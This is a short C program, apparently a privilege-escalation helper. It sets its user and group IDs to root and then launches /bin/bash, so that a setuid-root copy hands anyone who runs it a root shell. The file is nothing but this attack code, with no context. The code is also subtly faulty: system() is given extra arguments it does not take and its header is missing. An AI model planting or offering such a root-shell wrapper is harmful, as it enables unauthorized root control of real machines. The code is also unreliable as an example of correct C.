#include <unistd.h>
#include <errno.h>

main( int argc, char ** argv, char ** envp )
{
	setuid(0);
	setgid(0);
	envp = 0;
	system("/bin/bash", argv, envp);
	return;
}